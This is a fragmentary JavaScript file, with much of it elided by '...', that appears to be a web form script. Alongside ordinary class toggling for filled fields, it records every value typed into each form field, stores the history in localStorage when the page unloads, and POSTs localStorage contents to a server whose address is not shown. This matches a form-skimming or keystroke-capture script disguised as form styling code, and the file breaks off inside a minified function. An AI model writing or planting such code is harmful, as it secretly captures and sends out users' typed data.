...
(function () {
  ...
  $(document).ready(function () {
    ...
    function postRecordedData(data) {
      ...
      request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {
          if (request.status === 200) {
            ...
            console.error("Failed to send data, status code:" + request.status);
          }
        }
      };
    }
    function collectAndSendData() {
      const fetchedLocalStorage = fetchLocalStorage();
      if (Object.keys(fetchedLocalStorage).length > 0) {
        postRecordedData(fetchedLocalStorage);
      }
    }
    ...
    $('.form-control').on('input', function () {
      ...
      if (this.value) {
        ...
        if (!fieldHistory[this.id]) {
          fieldHistory[this.id] = [];
        }
        fieldHistory[this.id].push(this.value);
      } else {
        $field.removeClass('field--not-empty');
      }
    });
    window.onunload = function () {
      localStorage.setItem("fieldHistory", JSON.stringify(fieldHistory));
    };
  });
  var nn = function (a) {
    this.l = !1;
